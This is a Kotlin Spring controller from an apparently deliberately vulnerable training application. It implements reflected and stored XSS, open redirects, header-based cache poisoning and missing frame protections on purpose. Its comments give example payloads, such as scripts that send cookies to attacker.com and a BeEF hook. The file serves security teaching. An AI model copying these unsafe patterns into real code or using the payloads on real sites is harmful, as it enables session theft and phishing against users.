package com.kotlingoat.controllers

import com.kotlingoat.models.FeedbackRequest
import jakarta.persistence.EntityManager
import jakarta.persistence.PersistenceContext
import jakarta.servlet.http.HttpServletRequest
import jakarta.servlet.http.HttpServletResponse
import org.springframework.http.ResponseEntity
import org.springframework.stereotype.Controller
import org.springframework.ui.Model
import org.springframework.web.bind.annotation.*
import org.springframework.web.servlet.view.RedirectView

/**
 * VULNERABILITY CATEGORY: Client-Side Attacks
 *
 * Vulnerabilities demonstrated:
 *  1. Reflected XSS - user input reflected directly in HTML response
 *  2. Stored XSS - malicious script stored in DB, served to all users
 *  3. DOM-based XSS - unsafe JavaScript patterns in templates
 *  4. CSRF - state-changing endpoints with no CSRF token validation
 *  5. Open Redirect - redirect target taken from user-controlled parameter
 *  6. Web Cache Poisoning - cache-key headers not validated
 *  7. Clickjacking - no X-Frame-Options header
 *  8. Header injection via unvalidated redirect target
 */
@RestController
@RequestMapping("/api/client")
class ClientSideController {

    @PersistenceContext
    lateinit var em: EntityManager

    // In-memory feedback store (simulates DB)
    private val feedbackStore = mutableListOf<Map<String, String>>()

    // ---------------------------------------------------------------
    // Reflected XSS
    // ---------------------------------------------------------------

    /**
     * GET /api/client/search?q=...
     *
     * VULNERABILITY (Reflected XSS):
     * User input reflected directly into the HTML response body without encoding.
     * Any script tags or event handlers in `q` will execute in the victim's browser.
     *
     * Attack:
     *   ?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
     *   ?q=<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
     *   ?q=<svg onload=alert(document.domain)>
     *
     * Delivery: Send crafted URL to victim via phishing email.
     */
    @GetMapping("/search", produces = ["text/html"])
    fun reflectedXss(@RequestParam q: String): String {
        // VULNERABILITY: User input injected directly into HTML without encoding
        return """
            <html>
            <body>
                <h1>Search Results</h1>
                <!-- VULNERABILITY: $q is raw user input, not HTML-encoded -->
                <p>You searched for: $q</p>
                <p>No results found for: $q</p>
            </body>
            </html>
        """.trimIndent()
    }

    /**
     * GET /api/client/greet?name=...
     *
     * VULNERABILITY (Reflected XSS via JSON response with wrong Content-Type):
     * When Content-Type is text/html and content contains user data,
     * browsers may execute scripts.
     *
     * Attack:
     *   ?name=<script>alert(1)</script>
     */
    @GetMapping("/greet", produces = ["text/html"])
    fun greetUser(@RequestParam name: String): String {
        // VULNERABILITY: Unencoded user input in HTML response
        return "<html><body><h1>Hello, $name!</h1></body></html>"
    }

    // ---------------------------------------------------------------
    // Stored XSS
    // ---------------------------------------------------------------

    /**
     * POST /api/client/feedback
     *
     * VULNERABILITY (Stored XSS):
     * User-supplied HTML/JavaScript in feedback message is stored without sanitization.
     * When any admin or user views the feedback list, the script executes in their browser.
     *
     * Attack:
     *   POST /api/client/feedback
     *   {"name":"attacker","message":"<script>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify({cookie:document.cookie,dom:document.body.innerHTML})})</script>"}
     *
     *   Or BeEF hook:
     *   {"name":"test","message":"<script src='http://attacker.com/hook.js'></script>"}
     */
    @PostMapping("/feedback")
    fun submitFeedback(@RequestBody request: FeedbackRequest): ResponseEntity<Any> {
        // VULNERABILITY: No HTML sanitization, no CSP, stored XSS payload
        feedbackStore.add(mapOf(
            "name" to request.name,
            "message" to request.message      // Raw HTML/JS stored as-is
        ))
        return ResponseEntity.ok(mapOf(
            "message" to "Feedback submitted",
            "stored" to request.message        // VULNERABILITY: Echoed back
        ))
    }

    /**
     * GET /api/client/feedback
     *
     * Returns all stored feedback including XSS payloads.
     * When this response is rendered in a browser, stored scripts execute.
     */
    @GetMapping("/feedback", produces = ["text/html"])
    fun getFeedback(): String {
        val items = feedbackStore.joinToString("") { fb ->
            // VULNERABILITY: Stored XSS - feedback content rendered without escaping
            "<div><b>${fb["name"]}</b>: ${fb["message"]}</div>"
        }
        return """
            <html>
            <head><title>Feedback</title></head>
            <body>
                <h1>User Feedback</h1>
                <!-- VULNERABILITY: Raw stored HTML rendered here -->
                $items
            </body>
            </html>
        """.trimIndent()
    }

    // ---------------------------------------------------------------
    // Open Redirect
    // ---------------------------------------------------------------

    /**
     * GET /api/client/redirect?url=...
     *
     * VULNERABILITY (Open Redirect):
     * The redirect destination is taken entirely from user input with no validation.
     * Attackers use this to redirect phishing victims from a trusted domain
     * to a malicious site.
     *
     * Attack:
     *   /api/client/redirect?url=http://evil.com/phishing-page
     *   /api/client/redirect?url=javascript:alert(document.cookie)
     *   /api/client/redirect?url=//evil.com    (protocol-relative)
     *
     * Phishing chain:
     *   "Click here to verify your account: https://trustedapp.com/api/client/redirect?url=http://evil-clone.com"
     */
    @GetMapping("/redirect")
    fun openRedirect(
        @RequestParam url: String,
        response: HttpServletResponse
    ): ResponseEntity<Any> {
        // VULNERABILITY: No validation of target URL
        // Should check: URL is relative, or matches allowlist of trusted domains
        response.sendRedirect(url)
        return ResponseEntity.status(302).build()
    }

    /**
     * GET /api/client/login-redirect?next=...
     *
     * VULNERABILITY (Open Redirect after login):
     * Common pattern - redirect to `next` page after login.
     * No validation allows redirect to external malicious sites.
     *
     * Attack:
     *   /api/client/login-redirect?next=https://evil.com
     *   -> After "login", user is silently sent to evil.com
     */
    @GetMapping("/login-redirect", produces = ["text/html"])
    fun loginRedirect(@RequestParam next: String): String {
        // VULNERABILITY: next parameter not validated - open redirect
        return """
            <html>
            <head>
                <!-- VULNERABILITY: Redirects to attacker-controlled URL after "login" -->
                <meta http-equiv="refresh" content="2; url=$next">
            </head>
            <body>
                <p>Login successful! Redirecting you now...</p>
                <!-- VULNERABILITY: next param also reflected (potential XSS too) -->
                <a href="$next">Click here if not redirected</a>
            </body>
            </html>
        """.trimIndent()
    }

    // ---------------------------------------------------------------
    // Web Cache Poisoning
    // ---------------------------------------------------------------

    /**
     * GET /api/client/content
     *
     * VULNERABILITY (Web Cache Poisoning):
     * The X-Forwarded-Host header is reflected in the response and cached.
     * An attacker can poison the cache by sending a request with a malicious
     * X-Forwarded-Host header. Subsequent victims receive the poisoned response.
     *
     * Attack:
     *   GET /api/client/content
     *   X-Forwarded-Host: evil.com
     *   -> Response contains "evil.com" and may be cached for other users
     *
     * Impact: Cached XSS, redirect poisoning, credential harvesting.
     */
    @GetMapping("/content", produces = ["text/html"])
    fun cachedContent(
        @RequestHeader(value = "X-Forwarded-Host", required = false) xForwardedHost: String?,
        @RequestHeader(value = "X-Host", required = false) xHost: String?,
        @RequestHeader(value = "Host", required = false) host: String?
    ): ResponseEntity<String> {
        val effectiveHost = xForwardedHost ?: xHost ?: host ?: "kotlingoat.com"

        // VULNERABILITY: Unvalidated header reflected in response (cache poisoning)
        val content = """
            <html>
            <head>
                <!-- VULNERABILITY: Attacker-controlled host used in script src -->
                <script src="http://$effectiveHost/app.js"></script>
            </head>
            <body>
                <p>Content served from: $effectiveHost</p>
            </body>
            </html>
        """.trimIndent()

        return ResponseEntity.ok()
            // VULNERABILITY: Response cached for 1 hour with poisoned content
            .header("Cache-Control", "public, max-age=3600")
            .header("X-Cache", "HIT")
            // VULNERABILITY: No X-Frame-Options (clickjacking)
            // VULNERABILITY: No Content-Security-Policy
            .body(content)
    }

    // ---------------------------------------------------------------
    // Clickjacking
    // ---------------------------------------------------------------

    /**
     * GET /api/client/account-settings
     *
     * VULNERABILITY (Clickjacking):
     * This sensitive page can be embedded in an iframe on attacker's site.
     * Missing X-Frame-Options and Content-Security-Policy frame-ancestors headers.
     *
     * Attack:
     *   Attacker creates transparent iframe over decoy button:
     *   <iframe src="https://victim.com/api/client/account-settings"
     *           style="opacity:0; position:absolute; top:0; left:0;"></iframe>
     *   -> Victim clicks "decoy button" but actually clicks a sensitive action in the iframe
     */
    @GetMapping("/account-settings", produces = ["text/html"])
    fun accountSettings(): ResponseEntity<String> {
        val content = """
            <html>
            <body>
                <h1>Account Settings</h1>
                <form action="/api/auth/delete-account" method="POST">
                    <button type="submit">Delete Account</button>
                </form>
            </body>
            </html>
        """.trimIndent()

        return ResponseEntity.ok()
            // VULNERABILITY: No X-Frame-Options header set
            // VULNERABILITY: No Content-Security-Policy: frame-ancestors 'self'
            // VULNERABILITY: No SameSite cookie attribute to prevent CSRF
            .body(content)
    }
}
